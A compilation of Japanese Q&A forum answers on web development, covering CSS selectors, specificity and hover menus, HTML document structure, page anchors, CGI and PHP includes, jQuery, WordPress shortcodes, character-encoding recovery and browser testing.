￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［D. HTML 4のためのデフォルトスタイルシート( http://momdo.s35.xrea.com/web-html-test/spec/CSS … )］より 　が、ol,liに指定されています。 ★marginで余白を取るかブラウザで余白を取るか、またlist-style-positionをどの位置にするかは、実際にはブラウザによって異なりますから、 ol{margin-left:1em;padding:0;} などでしたら、ブラウザ間の表示差が避けられませんから、 ol{ margin:0.5em 0; padding:0; list-style-position:1em; line-height:1.4em; } ol li{ margin-left:2em; padding:0; } のように、すべて再設定するとブラウザ間の誤差も回避できます。
下記の2点を守る必要があります。 ・URLは英数で指定する。 ・リンク先にはURLで指定したidを付与する。 <a href="#photo">写真</a> ・ ・ ・ <div id="photo> 写真 </div>
そうではなくて、 a.noline { の.はクラスセレクタと言って 　class属性の値リストにnolineを含むa要素というセレクタです。 　class属性は、複数の値を半角スペースで区切った値のリストになっています。 <p><!-- 段落の開始 --> 　<span id="YAMADA" class="name first female">山田</span>君と<span id="ORUKA" <span id="TANAKA" class="name second male">田中</span>は、今日は欠席しました。そのために、この班は５人で実験を行なうことになりました。 </p> <p> 　今日は、塩酸と水酸化ナトリウムの中和実験をしました。 </p> 　このように、classは、複数の値を半角スペースでもつことができます。idはそのページ内で一箇所しかありませんが、classはそうではない。 name:このspanは名前 first|second:１列2列 female|male:女性|男性 　ここで、 span.name{font-weight:bold;}だと名前は太字 span.female{color:red;}だと女性は赤 span.male{color:blue;}だと男性は青 HTMLは文書構造だけを書きます。 a.nolineとは、classの値に一つにnolineをもつ　a　要素と言う意味です。 <a href="http://www.yahoo.co.jp/">yahooを開く</a> 　はclass属性を持ちませんから、このスタイルは適用されません。 　もしこのa要素にスタイルを適用させたければ a[href="http://www.yahoo.co.jp/"]{text-decoration:none;} と属性セレクタで指定すれば良いです。 　すべてのa要素でしたら a{text-decoration:none;} ★ まずHTMLをきちんと文書構造だけをマークアップすること ★ その文書構造を使ってセレクタを使ってスタイルを適用させたい要素を指定すること ★ スタイルは、text-decoration:none;というふうに、プロパティ:値;と記述する 　この順番です。 a[href="http://www.yahoo.co.jp/"]{text-decoration:none;} a{text-decoration:overline;} と書かれていたら、すべてのa要素は上に線が引かれます。しかし、href属性の値にhttp://www.yahoo.co.jp/をもつa要素には、適用されません。 　これは、a[href="http://www.yahoo.co.jp/"]のほうが、より詳しく指定されているためです。これを詳細度といいます。 a[href="http://www.yahoo.co.jp/"]の詳細度は 0011 a{text-decoration:overline;}の詳細度は 0001 5 セレクタ( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 6 プロパティ値とカスケーディング、継承の割り当て( http://momdo.s35.xrea.com/web-html-test/spec/CSS … )
<style> table { font-size: 2em; } table#ある特定のテーブル { font-size: 1.5em; } table.ある複数のテーブル { font-size: 1em; } *.ある複数のテーブルを囲む要素 table { font-size: 0.5em; } </style> <table> (2em) </table> <table id=ある特定のテーブル> (1.5em) </table> <table class=ある複数のテーブル> (1em) </table> <table class=ある複数のテーブル> (1em) </table> <section class=ある複数のテーブルを囲む要素> _ <table> (0.5em) </table> _ <table> (0.5em) </table> </section>
No.5です。 <li><a href="grape.html">グレープ</a><br></li> は、エラーにならないだけでスペースは空かない。 <br><br>と重ねると空くけど見栄えのために<br>を重ねるのは良くないので、CSSかULを分けるかしてください。
HTMLのlinkタグの属性とかで指定すればよいのですが スマホ向けの画面を書くのには使えません。 #メディアタイプではスマホとPCが区別できない。 メディアクエリーを使うことをお勧めします。
＞こんなシンプルにcssを定義するだけだなんてビックリ＼(◎o◎)／！です。 ははは・・・ あたこちサイトめぐって、訳も判らずつまみ食いしてもできません。 要点は　たったこれだけ ul{list-style:none;}/* ブロックにして */ ul,li{margin:0;padding:0;width:9em;}/* margin,paddinを消して幅を指定 */ ul li{position:relative;}/* 子孫の位置やサイズの基準になる */ ul li ul{ position:absolute;/* 親要素liの位置を基準に */ left:9em;/* 位置を指定 */ top:0; } /* 2階層目*/ ul li ul{display:none;} ul li:hover ul{display:block;} /* 3階層目*/ ul li:hover ul li ul{display:none;} ul li:hover ul li:hover ul{display:block;} /* 4階層目 */ ul li:hover ul li:hover ul li ul{display:none;} ul li:hover ul li:hover ul li:hover ul{display:block;} /* 5階層目 */ ul li:hover ul li:hover ul li:hover ul li ul{display:none;} ul li:hover ul li:hover ul li:hover ul li:hover ul{display:block;} とっつき難いですが、とにかく仕様書には目を通しておきましょう。 そうしないと、こんな簡単なことで躓いてしまう。 じゃ横に並べたリストの下に子供メニューを広げる。その項目の右に孫メニューはどうする。 これより、ずっと複雑になります。
１０年以上前に作った( http://hpcgi1.nifty.com/Iruka/fchem/C_F のhelpをクリック）ので、いまさら書こうとは思いませんがアイデアだけ この場合、/Iruka/fchem/C_F (拡張子はない)がCGIの実体 その後表示される /C_F 以下のURLはすべて実体はありません。 それ以降に「何もつけない」「/をつける」「/index.htmlをつける」のいずれも同じ内容です。 　helpは新しいウィンドを開きます。その新しいウィンドウでの動作が、あなたの言われる仕組みです。iframeでなくframeの違い。 　すべては、PATH_INFOと言う形でデータを渡しています。通常のCGIはQUERY STRING(?以下の文字列)ないし、STDIN(標準入力 method="post")で渡しますが、PATH_INFOで渡しています。 　そのPATH_INFOを元に、親ページと子供ページの内容を書き換えています。 ★今はスタイルシートが扱えますので、iframeではなく、スタイルシートで作成するでしょう。そのほうが簡単です。 　いずれにしても、ページ自体をCGIやPHPなどで動的に出力しないとうまく行かないでしょう。 ・CGIを使用して動的にページを作成する ・リンク先も自身にすれば良いです。その時のデータの渡し方は 　　・QUERY_STRING 　　・標準入力　リンクでは渡しにくい 　　・PATH_INFO 　のいずれでも良いでしょう。 ＞frame Ｂ_02.html のアンカー先を 表示したいと思っております。 　#以降はサーバーには送られませんから、それは直接は使えません。 　あくまで、CGIなどを利用しなければなりません。 　例えば、root/CGI/index.htmlのページ内(iframeでも可) 　<a href="/CGI/B1?target=section1>Bへ</a> 　として、CGIで 　<iframe src="/CGI/B1.html#section1"></iframeにするとか
誰か(ホームページビルダー)が余計な設定をしている。 ルートにある.htaccessを一旦、リネイムして見る。.htaccess→_htaccess スマホなどからのアクセスの場合は、/sp/blankpage.html にrewriteさせているのではないか？？ 　ビルダーは、家庭用のツールでしかありません。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　とはまったく逆の方向からアプローチしているソフトですから・・
No4です。 No7において、補足です。 D&Dしたファイルは、ダミーがファイル名（拡張子除く）で置換されて上書きされます。 複数のファイルをまとめてD&D出来ます。 「置換.wsf」の以下の箇所を変更して頂ければ「ダミー」意外にも対応できます。 strRepl="ダミー"; /* 置換対象文字列 */ 各htmlファイルの中で使用されている「ダミー」が全て置換されます。 「ダミー.jpg」以外にも「ダミー」を使用している場合、以下の2箇所を変更してください。 (1) strRepl="ダミー"; /* 置換対象文字列 */ 　　　　　↓ strRepl="ダミー.jpg"; /* 置換対象文字列 */ (2) strWith = objFs.GetBaseName(objArg(i)); 　　　　　↓ strWith = objFs.GetBaseName(objArg(i))+".jpg";
No.2のスタイルシートを説明を入れてあげておきます。このままスタイル部分を入替えると良いです。 ★背景色の指定はbackground-color、文字色はcolorです。 ★screenメディアのみのスタイル。印刷や携帯電話には適用されません。 　印刷プレビューで確認できます。 　印刷機や携帯用には、別のスタイルを書くことができます。 ★ウィンドウを狭めてみると分かるようにスマホ縦置き以上の幅があればきちんと表示されるはずです。 ★タブは＿に置換してあるので戻す。 慣れるまで、大変だと思いますが、慣れてしまえば 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから スタイルシートはこれらの問題を解決すると同時に、HTMLにおける制限されたプレゼンテーション機構に取ってかわる。スタイルシートでは、行間の設定やインデントの設定、テキスト色や背景色、フォントのサイズとスタイル、その他様々なプロパティの設定が簡単にできる。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Style Sheets in HTML documents (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より になります。 そのまえに、 　⇒HTML 4.01 Specification (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) を読んで、HTMLの基本だけは理解するほうが絶対に早く効率的です。 　とりあえず、どこに何が書いてあるかだけでも知っておくくらいでよい。 Anothter HTML LintをパスするHTMLが書けるようになったら 　⇒Cascading Style Sheets Level 2 Revision 1 (CSS 2.1) Specification (ja)( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) ★皆通ってきた道です。変なサイトで変なこと覚えると、直すのが大変です。 　最初から本道をたどるほうが早い。 <style type="text/css" media="screen"> <!-- html,body{margin:0;padding:0;}/* ブラウザの余白を消す */ p{ ＿text-indent:1em;/* 日本語なので段落が変わると一文字下げる */ ＿line-height:1.6em;/* 日本語も字が大きいので一行を高く */ ＿margin:0;/* marginは0 */ } div.header,div.section,div.footer{/* これらのdivブロックは */ ＿width:90%;min-width:470px;max-width:900px;/* 標準幅、最小幅、最大幅を指定 */ ＿margin:0 auto;/* 中央寄せ! これが中央寄せ */ ＿padding:5px;/* 周囲の余白 */ ＿background-color:rgb(255,255,160);/* 背景色を指定 */ } div.header h1{ ＿background-color:orange;/* 背景色 */ ＿border:outset orange 2px;/* ボーダー(枠線)の色と形 */ ＿line-height:2em;/* 行を高く */ ＿padding:0 10px;/* 内部の余白 */ ＿color:white;/* 文字の色 */ } div.section{ ＿position:relative;/* 子孫の要素の位置やサイズの基準とするため */ } h2{display:none;}/* 隠す */ div.section div.section{/* section(本文)中のサブセクション */ ＿margin:80px 0 10px 200px;/* 右と上を空ける */ ＿width:auto;min-width:0;/* 幅を上の指定を上書きする */ ＿background-color:white;/* 背景色 */ ＿border:1px solid orange;/* 枠の色 */ } div.section div.section h3{ ＿position:absolute;/* 上にずらしてその場から消す */ ＿top:-80px;/* 上に80px */ ＿width:90%;/* 幅 */ ＿padding:0 5px;/* 内側の余白 */ ＿font-size:20px;/* 文字の大きさ */ ＿line-height:40px;/* 行の高さ */ ＿background-color:white; /* 背景色 */ ＿border:1px solid orange;/* 文字色 */ ＿border-left-width:3px;/* 左のボーダーを広く */ } div.section div.nav{/* 本文中のナビゲーション */ ＿position:absolute;/* 絶対配置 */ ＿top:0;left:0;/* 本文の左上隅 */ ＿width:200px;height:100%;/* 幅と高さ、高さは本文にあわせる。 */ ＿text-align:center;/* 文字は中央 */ ＿line-height:40px;/* 行の高さ */ } div.section div.nav ol{ ＿margin:0;padding:0;/* 余白は0 */ } div.section div.nav ol li{ ＿list-style:none;/* リストじゃなくする */ ＿background-color:orange;/* 背景色 */ ＿border:outset orange 2px;/* 枠のスタイル */ ＿margin:2px;/* 周囲との余白 */ ＿padding:0; ＿color:white;/* 文字色 */ } --> ＿</style>
お勧めは画像です。 例えば実際に使用する名刺をスキャンして取り込み、それをホームページ（自社ウェブサイト）とかに貼り付けると悪戯電話とかないみたいですよ。 カラー名刺作成業者のテンプレートに、お店とかの屋号とか代表電話番号とか、メールアドレスとを入れて、最小ロットで作成してもらい、それを画像でスキャンし貼り付けると綺麗に見え、またロゴとかの作成代金より安くできます。 １番お金をかけない方法としては、エクセルとかで作成し、それを画像にして使用する感じです。 ただ、メールアドレスというのが画像にしますと、「ここにメール送ろう」と考えた人がコピー＆貼り付けで使う際に使用できませんので、問い合わせのメールが減るみたいです。 メールフォームだとどうしても発信側のＩＰアドレスとか抜きますからね。 そんな感じなので、「とりあえず問い合わせの電話もメールもガンガン欲しいという場合は、テキストデーターの方が良いのかもしれません。
＞ソースを見ればわかるものですか？ 　ソース(本文)ではなく、HTTP応答ヘッダです。 　ソースに書かれている場合もありますが、それは正確とはかぎりません。 　 　HTTPプロトコルでの通信の場合、必ずHTTP応答ヘッダに正確な更新日は含まれています。 通常は、そのページの余白で右クリックして現れるコンテキスト(その場で可能な)メニューからページの情報(firefox)、プロパティを選択すると更新日は分かるはずです。 　また、たとえば、Firefoxをお使いでしたら、Live HTTP Headers( https://addons.mozilla.jp/firefox/details/3829 )というアドオンを使うと丸分かりです。(^^) Last-Modified: Wed, 21 Jan 2004 19:51:30 GMT 　ただし、そのページが動的に構築されるページはどのようにしてもわかりません。
HTMLの仕事じゃない。HTMLは文書構造しか書かない。 <center>は、使うべきではない。 左右の中心には表示できますが、上下の中心には原則としてできません。 　ユーザーエージェントのディスプレイのサイズは様々で、screenに分類されるメディアでも縦置きのスマホから超幅広ディスプレイまで様々で、しかも視覚障害者はフォントを拡大して利用している可能性も多い。 　印刷を目的とする場合は、用紙をA4に、フォントサイズなども指定できますので、印刷用スタイルシートでそのように配置する事は良く行なわれます。
＞<html xmlns="http://www.w3.org/1999/xhtml" lang="ja,zh" xml:lang="ja,zh"> 　さすがに、XHTMLはもう使いませんが・・ 　　HTML5が持つ本当の意味 － ＠IT( http://www.atmarkit.co.jp/news/200801/25/html.html )の「XHTMLがあるのに、なぜ今さらHTML？」あたり。 <!doctype html> <html lang="ja"><!-- この文書が日本語であることを宣言 --> <head> 　<meta charset="utf-8"> 　<title>サンプル</title> 　<link rel="stylesheet" href="css/style.css"> </style> </head> <body> ＿<header> ＿＿<h1>アラビア語<span lang="en-us">Arabic language</span><span lang="ar" dir="rtl">اللغة العربية</span></h1> ＿＿<p>アラビア語は、アフロ・アジア語族のセム語派に属する言語の一つ。</p> ＿＿<p lang="en-us">The Arabia language is one of the languages that belong to Semitic languages of a Afro Asian family of languages. </p> ＿＿<p lang="ar" dir="rtl">تنتمي اللغة العربية إلى أسرة اللغات السامية المتفرعة من مجموعة اللغات الإفريقية الآسيوية. وتضم مجموعة اللغات السامية لغات حضارة الهلال الخصيب القديمة، </p> ＿</section> で良いです。 標準スタイルシートで *[lang|="en"],*[lang|="ar"]{color:gray;} として代替スタイルシートでは <link href="english.css" title="English" rel="alternate stylesheet" type="text/css"> 　で *[lang|="en"]{color:black;} とするとか・・
機能としては標準ですが、運用的にはあまりよろしくないですね すなおに <input type="hidden" name="abc" value="123"> で埋め込めば済む話です ポイントとしては２点、キーが競合する場合がある 一つは$_REQUESTで参照する場合、phpinfo()でcore情報のvariables_orderで 指定されている順の優先順位になります 通常はGPCSなのでGET>POST>クッキー>セッションです もちろん$_GETや$_POSTで明示的に参照すれば問題はありません もう一つはmethodをGETにして、パラメータでも同じキーを渡すと 判断がつかないのでブラウザの解釈によります。 いずれにしろ中途半端になるので、できればデータの受け渡し方法は 一つにまとめた方が無難です。
> ローカル専用のHTMLはどの程度安全なのか（テキストファイルと同じくらい安全なのか） まったく同じです。 HTMLだから危険ということはありませんし、テキストファイルだから安全ということもありません。 > ローカル専用のHTMLとパスワードつきページとではどちらがより安全か パスワードつきというのは、Web公開してのパスワードページということでしょうか。それならば、前者のほうが安全でしょう。なぜならば公開していないんですから。語弊があるかもしれませんが、例えるなら、前者は住所も分からなければ、一般人には鍵の開け方も分からない状態です。後者は、玄関先はまでは行けるけど、鍵がかかっている状態です。 > サイトにパスワードをつければ本当に安全になるのか ならないと考えたほうが無難です。 一口にパスワードと言っても、いろんな認証の方法がありますが、どんな方法を使っても、100%防げる手立てはありません。あくまで、突破されにくくなるだけです。と言っても、一般人には難しい場合がほとんどでしょう。 > どうしても疑い深くなってしまって、エバーノートなどのクラウドサービスも半信半疑で使っています… evernoteもdropboxも安全ではありません。 ただ、危険というわけではないので、難しいところです。 少なくとも、絶対に漏洩したくない情報を保存する場所ではないのは確かです。間違ってもクレジットカードなどの情報は保存されないように。 ローカル保存で安全に運用できるアプローチを考えてみます。 1. ネット接続をしない安価なPCを一台つくる。HTML編集程度ならどんな安いPCでも可能です。また、PC自体にも認証機能を設けるべきでしょう。 2. データは外部ディスクに保存する。今は安価に認証機能を持ったHDDやUSBメモリがあります。編集したり参照したりするときだけPCに接続するすれば、より安全性は高まるでしょう。万が一HDDやUSBの紛失・盗難などがあったとしても、認証機能が守ってくれる部分もあります。(もちろん100%ではありませんが。) あと、気になったのは、バックアップです。 それほど重要な情報でしたら、データや保存している媒体が壊れてしまった時のことを想定されていますか?　いくら他人に見られないように頑張っても、自分が見られないようになってしまっては元も子もありませんよ。
＞メモ帳を使ってhtmlファイルを作っていたんですが、保存したファイルを開くと、開かないままホームページに飛んでしまいます。 　これはどうしてもならないはずです。!!以下の説明を 「保存したファイルを開くと、開かないままホームページに飛んでしまいます。」 　ファイルをダブルクリックと言う事ですか？ 　別法として、エクスプローラーからファイルを見つけて、そのファイルを右クリックしてコンテキスト（その時点で可能な）メニューを開き、そこにある「開く」では、ブラウザは起動するけど、 そのファイルを開けないということですか？？ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 　拡張子が.htmlや.htmになっていると、Windowsの場合は関連付けされているためブラウザでそのファイルを開くはずです。 単純な下記ファイル <body>タイトル</body> だけをメモ帳で作成して、ファイル名をtest.htmlとして保存してチェック ブラウザには タイトル とだけ表示されるはずです。 ＞開かないままホームページに飛んでしまいます。 　この意味が分からない。ホームページと言う言葉に齟齬がありませんか。これ間違っていると質問事態の意味が伝わらない 　⇒ホームページ - Wikipedia( http://ja.wikipedia.org/wiki/%E3%83%9B%E3%83%BC% … ) 　ホームページとはブラウザを起動したときに最初に表示されるページの事です。ブラウザの[設定]メニューからホームページを指定する画面に進んで指定します。 　ひょっとして、ホームページをブラウザで表示すること。あるいはウェブサイト、ウェブページと混同されていませんか？ ★ホームページはホーム(出発点/故郷/基点)になるページと言う意味。 「保存したファイルを開くと、開かないままホームページに飛んでしまいます。」 ではなくて、 「メモ帳でHTMLを作成して拡張子を.htmlにして保存すると、ダブルクリック(開く)操作をするとブラウザが起動してしまう」 と言う意味では？？ なら ・ファイルを右クリックしてコンテキストメニューから 　「編集」を選択 　「アプリケーョンから開く」→メモ帳などテキストエディタを指定 ・メモ帳を開いて、そのメニューから開きたいファイルを選択 　
表示させたい箇所にIDが付与されているならば、ページ内アンカーを用いればできます。 相手先のソースが下記のような例で、本文2を表示させたい場合は、 http:/example.com/targetpage.html ----------------------------------- <article id="content1"> 本文1 </article> <article id="content2"> 本文2 </article> -------------------------------------- 下記のようにリンクを書くことができます。 <a href="http://example.com/targetpage.html#contet2">本文2へのリンク</a> ただし、No.1さんが言うとおり、相手先のソース次第なので、ラベル(ID)がないときは諦めるしかありません。
ActiveXとフレームの構成は、今でもIE限定で使えなくはないですが、10年以上前のものです。 また、ソースを見る限り、テーブルレイアウトというかなり古いコーディングを採用されていますね。 今なら、exeにあたるアプリケーションは、サーバーサイドで作って、通信はAjax(JavaScript)を用います。メニュー部とコンテンツ部のレイアウトはすべてCSSだけで解決できます。
いろいろ方法はありますが、もっとも簡単な方法を紹介します。 PHPが使えることが前提(今どきPHPを使えない環境はかなり珍しい)です。 1. 読み込むテキストファイルを作成します。 ここでは読み込みを行う側のHTMLと同じ階層にnews.txtとして保存することを仮定します。 2. 対象HTMLファイルの拡張子を.htmlから.phpに変更します。 次に、同ファイル内の読み込みを行いたい箇所に以下を追記します。 <?php include('news.txt');?> 以上です。 とても簡単ですよね! 他にもAjaxを使う方法などいろいろありますが、おそらく今回の方法が最も簡単です。
>.redbuttonや.blacbuttonとcssで指定したときに >.redbuttonにマウスカーソルが重なると白に、 >もう一つのblacbuttonにマウスカーソルが重なると赤に >のように個別に指定する方法がありましたら教えてください。 （改行位置変更） .redbutton { background-color:red;} .redbutton:hover { background-color: white; } .blackbutton { background-color: black; } .blackbutton:hover { background-color: red; } ですかね？ 文字の色を白・赤に変えたいのか、背景色を白・赤に変えたいのかわかりませんが、とりあえず背景色にしました。
先の回答者が説明している通り、formに送信文字コード指定するのが簡単かなとは思います。 あと参考までに思いつくものをいくつか。 　 ・ファイルの文字エンコード（htmlの指定と別の場合が……） ・htaccessの設定 CGIの中身がわかりやすいものでしたら 送信先の部分で、展開前に 文字エンコーディングの自動判別→データ変換という手も使える…かも……
高機能なものを作るならば、サンプルサイトのようにJavaScriptを使ってできますが、表示を切り替えるだけならCSSだけでできます。たとえばCSSだけでつくるSlideShowを参考にしてみると分かりやすいと思います。単にCSSで表示のON/OFFを切り替えるだけですから。
一見してShift_JISからLatin-1(別名: Windows1252、ISO-8859-1、西欧)への文字化けとわかりますが、 文字コードを変えても読めないというところからするに、 「文字化けした文字列を別の文字コードで保存してしまった」状況と考えられます。 こうなると完全な復元は不可能です。 部分的な復元でよければ、その文字列をコピーし、保存時に文字コードが選べるテキストエディタでLatin-1として保存し、そのファイルをShift_JISで開けば読めるでしょう。 例えばお示しの文は 「いつまでこのペ?[ジが続くの?H?@なんて思ってた・なたの」 と復元できます。
<TABLE>のスペルが間違っています。
どうしてもというのであればonload時にnameをチェックして 揺らぎがある場合は、強制的に別名につけかえ サブミットするさいに元に戻す・・・的な煩雑で実用性に乏しい処理になるでしょう またformを分けるという手がありますが両方の値をサブミットするには 結局特殊な参照方式が必要になるのでそれも手に余るとおもいます
No.1です。 ちなみになんですが、htmlの全てのタグには意味があります。 意味のないタグはひとつもありません。 そこで、divって何?って話になるかと思います。 divは、CSS用の要素であったりとか、適当なタグが見当たらない時に使うなどと誤解されている方が多いですが、それは誤りです。 divは「特別な意味がないこと」を指し示す要素です。
No.1,2,4です。 ＞詳細度が高くなる&他の人が見やすいことを考えると、ul li ul li の方が良いかもしれませんね。 ・HTMLに文書構造だけ記述すればよいので 　HTMLが簡素で分かりやすくなりメンテナンス性が向上する。 　(例) 　　<div class="left">と書いていて将来右に置きたくなったら？？ 　　同じものを<div class="nav">だとどうにでもなる。 　　　検索エンジンもnavのclass名は理解してくれる。 　詳細度を含むカスケーディングの仕組みはCSSの命ともいえる仕組みですが、詳細度は後からついてくるものです。そのためにじゃない。 div.nav ol,div.nav ol li{list-style:none;margin:0;padding:0;} とすると、そのHTML内のナビゲーションリストはすべてブロックでmarginもpaddingも0になる。 　そのうえで、div.header div.nav ol li{display:inline-block;width:20%;}で、div.header(ヘッダブロック)内(半角スペースの子孫セレクタ)のナビげーョンとなるし、div.section div.nav{width:20%;position:absolute;top:0;left:0;position:absolute;} div.section div.nav ol li{width:100%;} とすれば、本文内のナビゲーションリストは左に配置される。 　HTMLにデザインのためだけに、classやidを使わないほうが、楽になるのです。 ＞floatについては画像周囲にテキストというより、右と左に要素を分けるという認識でしたので、 　これは、最初のカスケーディングスタイルシートCSS1.0では、inline-blockがなかったために、やむなくfloatを使用していた痕跡です。 　今はIE7以前のブラウザは無視してよいですから、floatじゃなくinline-blockを使う。 ※デザインのためにHTMLを書かずに様々にデザインする例 　⇒ナビゲーションリストを様々にデザインしてみよう。( http://www.ichiya.com/WebService/Howto/sample/HT … ) 　代替スタイルシートに対応したブラウザ--google Chrome以外)で、[表示]→[スタイル(シート)]に進んで、他のスタイルを選択したり、印刷プレビューで印刷を確認してご覧なさい。スタイルシートなしやLynxブラウザで見ると検索エンジンがどう見ているかも分かります。
「index.htmlがつく設定を解除する方法」ではなくて、なぜindex.htmlが付くのかを解決して方がいいんじゃありませんか。 まず、環境を書きましょう。 どのような作業をしているのか、「貼り付けたら変換される」とは、エディタでCtrl+vした時点で変換されるとは考えにくいでしょ。
そういうのは自分でつくらないとないんじゃないかなー。 要望がニッチするぎるよ。 無料での限界というやつですよ。
せっかく補足を頂いたのですが、それでも分からない 　とりあえず2.については後回しにして・・ ＞ベースにしているcssでのメニュー表示は以下のようになっています。 ＞■スマホ用表示 ＞　上メニュー：折り畳みメニュー ＞　左メニュー：非表示 ＞■PC用表示 ＞　上メニュー：横並び表示 ＞　左メニュー：縦並び表示 　あくまで文書構造とデザインを分けて考えてください。--それが分からなくなる理由 「上メニュー/左メニューではない」ということです。そのナビゲーションがなんであるかです。 　例えば、サイト全体のナビゲーション--サイト内ナビゲーション--は通常のHTMLでは文書のヘッダ部やフッタに入るはずです。本文ではない。一方本文内の細目を示す目次のナビゲーションは本文ブロックに書きますね。 ★分かりやすいようにHTML5で書くと下記の様になります。 　HTML4では、<div class="header"></div>の様にマークアップすることになっていた。 <header> 　　・・・文書の見出しや要約等・・・ 　　<nav>サイトナビゲーション</nav> </header> <section> 　　・・・本文記事(章)・・・ 　　<section> 　　　・・・本文記事(項)・・・ 　　</section> 　　<section> 　　　・・・本文記事(項)・・・ 　　</section> 　　<nav id="contentTable">目次</nav> </section> <footer> 　・・・文書のフッタ・・・ 　著作権とか更新日とか 　かんたんなナビゲーションは、<nav></nav>でマークアップしなくて良い </footer> 　そのうえで、 幅の狭いスマホ---screenメディアには■スマホ用表示 　サイトナビゲーションは、普段は畳んでおいて、必要なとき広げて表示する。 　目次は：非表示にする。 幅の広いディスプレイには■PC用表示 　サイトナビゲーションは横並びに広げておく 　目次：本文右横に縦並び 　と言う説明でしたら、誰にでもされたいことが分かりますよね。もちろん上/左じゃないですから、 ★サイトナビゲーションはページ最下段に固定して貼り付けて・・ ★目次は右において必要なときにプルダウン 　とか、いつでも変更できる。 先に紹介した ナビゲーションリストを様々にデザインしてみよう。( http://www.ichiya.com/WebService/Howto/sample/HT … ) 　を再度確認して、されたい事を補足してください。
IE Testerですか。もはや懐かしいですね。たしかに現在はまず使いませんね。実物を使わないなら互換モードで確認すれば十分ですしね。互換モード以上の確認をしたいのならVMでしょうね。「OSを用意するのが大変」という心配は要りません。IEのテスト用にマイクロソフトがOSごと無料で提供しています。 https://www.modern.ie/ja-jp IE6より古いものは提供していませんが、IE6以降のテスト用にVMのイメージがOSごと提供されています。 しかも、 ・Hyper-V用 ・Virtual PC用 ・VirtualBox用 ・VMware Player用 とそれぞれ用意されていますし、さらにMacでもLinuxでも構築できるよう提供されています。ものすごく親切です。OSのインストールが不要なため簡単に導入することができます。非常にお勧めです。 また、それすら面倒くさいという人のために以下のクラウドサービスもあります。 Cross Browser Testing Tool. 300+ Browsers, Mobile, Real IE. http://www.browserstack.com/ こちらを使うとクラウド上で各種OS・各種ブラウザ・各種バージョンのテストが非常に簡単にできます。しかしこちらは有料で、トライアルとして3ヶ月のみ無料で使えます。料金は一番安いBasicで「$ 99 /mo, 2 parallel tests」とのことです。個人だと高いですが、テストを日常的に行う会社なら安いと思います
本当にdoubleですか? 本当にvoid * ですか? void*はポインタでdoubleは数値です。 本来はキャストできるものではありません。 #1のエラー内容から ・Get??? が NULL を返している ・初期化されていない(どこを指しているのか不定な)ポインタを Get??? が返している というあたりが予想されます。 デバッガを使ったり void * p = get???() ; printf("%p\n",p) ; 等して get??? がどんな値を返しているのか、確認してください。 あと、その Get??? のマニュアルに詳しく書いてないですか? もし、公開されているライブラリなら、具体的にどのライブラリか教えていただけるとよいのですが。 例えば Get???: get property value とあって、その後に個別に GetAAA: (説明) GetBBB: (説明) ... 等とあるとか doubleのビットパターンを、void * に入れて返している可能性も0ではないです。
テンプレの文字コードがUTF-8なので、 上書き保存する時UTF-8で保存すれば良いと思います。
$("[name='test']").click(function(){ var num = $("[name='test']").index(this); if(num == 1){ $("#box").removeClass("box_l").addClass("box_r").removeAttr('style'); $("#tab").removeClass("tab_l").addClass("tab_r").removeAttr('style'); } else { $("#box").removeClass("box_r").addClass("box_l").removeAttr('style'); $("#tab").removeClass("tab_r").addClass("tab_l").removeAttr('style'); } }) とすればとりあえずうまく動くようです。 animateやcssであてたstyleがclassよりも優先されるのでそのような動作になるようです。 animationをcssだけで表現すればclassのaddとremoveでもっとかんたんに書けるはず。
特定のPCのFirefoxのみ表示されないのなら、ぱっと思いつく原因は、 １．Firefoxのセキュリティなどの設定 ２．追加したアドオン ３．Firefoxのバージョンが高いまたは低い ４．Firefoxのプログラムに破損がある まずは、表示されるPCのFirefoxのバージョンや設定を確認して、同じ状態でご自身のPCで問題が解決するか確認してみてはどうですか。 それでだめなら、Firefoxを一旦アンインストールして、再度公式サイトからダウンロード＆インストールすることをお勧めします。 ※Firefoxを削除するときは、ブックマークなどのバックアップを忘れないように。
＞<p id="#01">ここ</p> まさにここです。#は不要、それ以前に<a href></a>に対応するアンカーは<a name></a>です。
超泥臭いけどショートコードを使ったらどうだろう。 今使ってるテーマのfunctions.phpに、以下のような内容を追記。 ～～～～～～～～ function tokyo_code() { 　return '20'; } add_shortcode('tokyo', 'tokyo_code'); function hokkaido_code() { 　return '30'; } add_shotcode('hokkaido', 'hokkaido_code'); ～～～～～～～～ これでページBやページCの本文に ・東京の番号は[tokyo]です。 などと書けば、表示時に ・東京の番号は20です。 と変換される。 多分tokyoやhokkaidoというのは例であって実際はもっと多いのだと推測される。という事で連想配列にしてみよう。 ～～～～～～～～ function basho_code($attributes) { 　$bcodes = array( 　　'unknown' => '-1', 　　'tokyo' => '20', 　　'hokkaido' => '30', 　　'hiroshima' => '40' 　); 　extract(shortcode_atts(array('bcode' => 'unknown'), $attributes)); 　return $bcodes[$bcode]; } add_shortcode('basho', 'basho_code'); ～～～～～～～～ 使うほうは ・東京は[basho bcode="tokyo"]です。 という感じになる。 後はお好きなタイミングでfunctions.phpの中でコードの値を変えてやればいい。
